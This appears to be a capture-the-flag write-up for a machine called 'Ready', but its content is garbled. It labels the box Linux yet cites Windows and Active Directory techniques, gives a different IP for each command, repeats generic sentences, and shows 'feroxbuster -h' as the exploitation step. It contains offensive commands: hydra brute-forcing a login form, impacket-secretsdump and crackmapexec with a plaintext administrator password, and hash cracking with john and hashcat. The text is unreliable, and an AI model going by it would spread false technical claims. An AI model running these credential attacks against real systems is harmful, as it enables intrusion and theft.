---
TitleSEO: "PwnTillDawn — Ready (Easy Linux) | ZureFX"
TitlePost: "PwnTillDawn — Ready (Easy Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Ready. SeImpersonatePrivilege and AlwaysInstallElevated to achieve easy compromise on Linux."
Keywords: "pwntilldawn, ctf, easy, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-ready-280.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-ready-280/"
Date: "2025-04-23"
Tags: "PwnTillDawn, CTF, Easy, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-ready-280"
Permalink: "/writeups/htb-ready-280.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Ready** is rated **Easy** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.116.18.217`.

### Objectives

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.154.51
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.70.214.131 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p587,22,464 10.121.47.90 -oN scan.txt
```

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services.

### Service Enumeration

The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
gobuster dir -u http://10.89.172.15/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.60.171.108
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible.

```bash
crackmapexec smb 10.40.115.2 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

## Exploitation

### Vulnerability Identification

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files.

Key finding: **Kerberoasting**.

Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials.

### Initial Access

Unconstrained delegation was enabled on the compromised machine. The application stored sensitive credentials in an unencrypted configuration file.

```bash
crackmapexec smb 10.49.164.235 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p443,5985,110 10.105.199.101 -oN scan.txt
crackmapexec smb 10.87.221.71 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

## Privilege Escalation

### Enumeration

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
feroxbuster -h
```

### Exploitation

Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
feroxbuster -h
```

The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Summary

### Tools Used

- `atexec`
- `rubeus`
- `nmap`
- `rpcclient`
- `netcat`
- `ffuf`

### Key Takeaways

- SeImpersonatePrivilege
- AlwaysInstallElevated
- Kerberoasting
